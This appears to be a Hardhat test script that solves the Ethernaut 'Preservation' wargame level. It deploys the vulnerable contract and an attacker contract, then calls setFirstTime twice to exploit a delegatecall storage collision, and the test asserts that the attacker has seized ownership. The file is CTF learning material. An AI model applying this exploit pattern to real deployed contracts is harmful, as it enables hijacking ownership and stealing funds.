import { expect } from "chai";
import { ethers } from "hardhat";

describe("Preservation", async function () {

  it("Should complete the function with no error", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const LibraryContract = await ethers.getContractFactory("LibraryContract");
    const libraryContract1 = await LibraryContract.deploy();
    await libraryContract1.deployed();

    const libraryContract2 = await LibraryContract.deploy();
    await libraryContract2.deployed();

    const Preservation = await ethers.getContractFactory("Preservation");
    const preservation = await Preservation.deploy(libraryContract1.address, libraryContract2.address);
    await preservation.deployed();
    //setup-

    //1.Deploy attacker
    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
    const preservationAttacker = await PreservationAttacker.deploy();
    await preservationAttacker.deployed();

    //2.Change timeZone1Library
    await preservation.connect(attacker).setFirstTime(preservationAttacker.address)

    //3.Call attacker
    await preservation.connect(attacker).setFirstTime(attacker.address)

    expect(await preservation.owner()).to.eq(attacker.address)
  });

});
